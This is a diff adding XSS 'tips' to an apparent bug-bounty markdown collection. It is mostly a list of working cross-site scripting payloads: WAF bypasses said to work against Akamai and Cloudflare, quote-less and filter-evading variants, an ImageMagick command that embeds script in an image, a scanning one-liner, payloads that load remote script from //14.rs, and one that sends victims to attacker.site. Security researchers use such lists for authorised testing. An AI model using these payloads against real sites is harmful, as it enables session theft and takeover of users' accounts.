@@ -24,3 +24,198 @@ https://twitter.com/therceman/status/1466913634538426368
 
 
 ### Tip 4:
+In profile page
+
+Signup 
+Go to edit profile 
+Add these payload 
+
+"><img src=x onerror=alert(1)>
+
+In website or Facebook link or Twitter etc..
+
+Easy SXss
+
+
+### Tip 5:
+XSS TIP : to bypass WAF  
+@PecentZero
+
+Inserting space before (),[], .  is allowed  when execute command ,you can replace space with /**/ 
+alert/**/("XSS")
+alert/**/?.("XSS")
+alert?./**/("XSS")
+alert/**/?./**/("XSS")
+window?./**/[/al/.source+/ert/.source]/**/('XSS')
+
+
+### Tip 6:
+XSS WAF Bypass Tip:
+
+try url encoding the parameter name in your PoC URL!
+
+?page=";confirm`1`//   ➡️ 302
+
+?pag%65=";confirm`1`//   ➡️ 200 + XSS!
+
+
+### Tip 7:
+Bug Bounty Tips:
+
+Akamai XSS Bypass:  “><svg/on</script>laod=alert>
+
+Cloudflare XSS Bypass: <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
+
+### Tip 8:
+TIP:
+
+Blind XSS in User-Agent
+
+You can also use Auto-Repeater or Chrome Dev tools the more options the better.
+
+
+### Tip 9: 
+Cross Site Scripting(XSS) bypass tips:
+
+I had found HTML injection and when i try to chain to xss
+
+"><svg/onload=alert(1)>
+Access Denied!
+
+"><script src="//14.rs">
+Successfully executed the script!
+
+
+### Tip 10:
+Move things out of their usual place.
+
+In examples below both the payload and ">" are misplaced on purpose:
+
+<Img Src="//X55.is/> "OnError=import(src)//
+https://brutelogic.com.br/gym.php?p05=%3CImg+Src=%22//X55.is/%3E+%22OnError=import(src)//
+
+<Img Src="javascript:alert(1)> 1"OnError=location=src//
+https://brutelogic.com.br/gym.php?p05=%3CImg+Src=%22javascript:alert(1)%3E+1%22OnError=location=src//
+
+
+### Tip 11:
+Awesome Tips & Tricks
+http(s):// can be shortened to // or /\\ or \\.
+document.cookie can be shortened to cookie. It applies to other DOM objects as well.
+alert and other pop-up functions don't need a value, so stop doing alert('XSS') and start doing alert()
+You can use // to close a tag instead of >.
+I have found that confirm is the least detected pop-up function so stop using alert.
+Quotes around attribute value aren't necessary as long as it doesn't contain spaces. You can use <script src=//14.rs> instead of <script src="//14.rs">
+The shortest HTML context XSS payload is <script src=//14.rs> (19 chars)
+
+
+### Tip 12:
+Tips Xss image file 
+
+command: convert -comment ''"><script>alert('xss')</script>' -size 1x1 xc:'#000000' xss.png  
+
+https://hackerone.com/reports/93807
+https://brutelogic.com.br/blog/file-upload-xss/
+
+
+### Tip 13:
+Somedays ago read a tip about stored xss. 
+That is : always put something before the xss payloads. Like 
+TEST"><svg onload=alert(1)//
+And when you start fonding for The TEST word.the xss should be fired. 
+
+**yup got a stored xss via this tips** 
+
+
+### Tip 14:
+Another nice tips for find XSS One-Liner:
+
+echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
+
+Ref: kingofbugbounty
+
+
+### Tip 15:
+XSS Tips:
+
+1- alert(1) isn't enough, use alert(document.domain) or alert(window.origin) to check what domain your payload is executed on.
+
+this blog will explain why:
+
+🔗https://liveoverflow.com/do-not-use-alert-1-in-xss/
+
+
+### Tip 16:
+#XSS is about to control user actions. The cited tweet + https://twitter.com/brutelogic/status/1495769940615442434 helped me to have #XSS done
+
+Payload: '"><p only=1337 onmouseenter=window.location.href=//attacker.site>Over me :)
+
+Thank you for sharing tips 
+@brutelogic
+
+
+### Tip 17:
+Cross Site Scripting(XSS) bypass tips:
+
+"><script>alert(1)</script>
+Access Denied!
+
+&"><script>alert(1)</script>
+200 OK (Successfully executed!)
+
+
+### Tip 18:
+Awesome Bypassing
+Note: None of these payloads use single (') or double quotes (").
+
+Without event handlers
+<object data=javascript:confirm()>
+<a href=javascript:confirm()>click here
+<script src=//14.rs></script>
+<script>confirm()</script>
+
+Without space
+<svg/onload=confirm()>
+<iframe/src=javascript:alert(1)>
+Without slash (/)
+<svg onload=confirm()>
+<img src=x onerror=confirm()>
+
+Without equal sign (=)
+<script>confirm()</script>
+Without closing angular bracket (>)
+<svg onload=confirm()//
+
+Without alert, confirm, prompt
+<script src=//14.rs></script>
+<svg onload=co\u006efirm()>
+<svg onload=z=co\u006efir\u006d,z()>
+
+Without a Valid HTML tag
+<x onclick=confirm()>click here
+<x ondrag=aconfirm()>drag it
+
+Bypass tag blacklisting
+</ScRipT>
+</script
+</script/>
+</script x>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
